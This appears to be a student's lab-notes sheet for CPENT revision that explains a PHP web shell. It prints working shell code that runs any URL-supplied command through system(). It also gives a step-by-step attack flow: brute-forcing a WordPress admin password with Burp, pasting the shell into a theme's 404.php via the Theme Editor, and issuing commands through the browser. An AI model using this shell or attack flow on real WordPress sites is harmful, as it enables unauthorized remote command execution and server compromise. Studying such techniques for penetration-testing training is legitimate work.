````markdown
# PHP Web Shell (CPENT Lab Notes)

## Objective
Upload a simple **PHP Web Shell** into **404.php** to execute Linux commands through the browser.

---

## PHP Web Shell Code

```php
<?php
if(isset($_REQUEST["cmd"])){
    echo "<pre>";
    $cmd = $_REQUEST["cmd"];
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

---

## How it Works

```
Browser
   │
?cmd=whoami
   │
   ▼
404.php
   │
system("whoami")
   │
   ▼
Linux Server
   │
   ▼
Output shown in Browser
```

---

## Code Explanation

| Code | Purpose |
|------|---------|
| `$_REQUEST["cmd"]` | Reads the command from the URL. |
| `system($cmd)` | Executes the command on the Linux server. |
| `<pre>` | Displays output in a readable format. |
| `die;` | Stops further PHP execution. |

---

## Example

**URL**

```text
http://target/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

**Command Executed**

```bash
whoami
```

**Possible Output**

```text
www-data
```

---

## Useful Commands

| URL Parameter | Linux Command | Purpose |
|---------------|---------------|---------|
| `?cmd=whoami` | `whoami` | Current user |
| `?cmd=id` | `id` | User & Group IDs |
| `?cmd=pwd` | `pwd` | Current directory |
| `?cmd=ls` | `ls` | List files |
| `?cmd=ls -la` | `ls -la` | Detailed file listing |

---

## Why 404.php?

- Editable through **Appearance → Theme Editor**
- Executes PHP code
- Easy place to upload a web shell

---

## Attack Flow

```text
Weak Password
      ↓
Burp Dictionary Attack
      ↓
Admin Login
      ↓
Appearance → Theme Editor
      ↓
404.php
      ↓
Paste PHP Web Shell
      ↓
Update File
      ↓
Visit:
404.php?cmd=<command>
      ↓
Execute Linux Commands
```

---

## Remember

- **`$_REQUEST`** → Gets the command from the URL.
- **`system()`** → Executes the command on the server.
- **404.php** → Used as the web shell entry point.
- Output is displayed directly in the browser.
````

This is enough for **CPENT revision**—only the important concepts, commands, and flow without unnecessary details.
